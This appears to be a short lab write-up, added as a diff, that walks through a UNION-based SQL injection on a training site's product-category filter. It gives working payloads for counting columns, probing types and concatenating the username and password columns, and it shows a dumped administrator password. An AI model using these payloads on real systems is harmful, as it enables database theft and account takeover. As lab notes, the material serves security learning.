@@ -1,0 +1,46 @@
+LAB DESCRIPTION
+1. SQLi vuln in product category
+2. Database contains table users with col username, password
+
+GOAL
+1. Retreive all username and password
+2. Login as administrator
+
+PREREQUISITE
+
+1. To retrieve multiple values in a single col (if query returns only single col)
+    We use concatenation techniques such as:
+    a) Oracle and PostreSQL 'foo'||'bar' 
+    b) microsoft : 'foo'+'bar'
+    c) mySQL: 'foo' 'bar'
+2. query: ' UNION SELECT username || '~' || password FROM users-- 
+3. response: wiener~something
+
+ANALYSIS
+
+1. Get total col 
+    a)' UNION SELECT NULL--
+        <internal server error>
+    b)' UNION SELECT NULL, NULL--
+        displayed page
+
+total col = 2
+2. finding what data types the col accept
+    a)' UNION SELECT 'a', NULL--
+        <internal server error>
+
+    b)' UNION SELECT NULL, 'a'--
+        displayed the page
+    c)' UNION SELECT 'a', 'a'--
+        <internal server error>
+
+3. get all username and password
+    a)get all usernames
+        ' UNION SELECT NULL, username FROM users--
+            administrator
+            wiener
+            carlos
+    b) get username and password in single
+        ' UNION SELECT NULL, username || '-' || password FROM users--
+            administrator-1m55eci3gwpquusrcq5p
+4. login as administrator
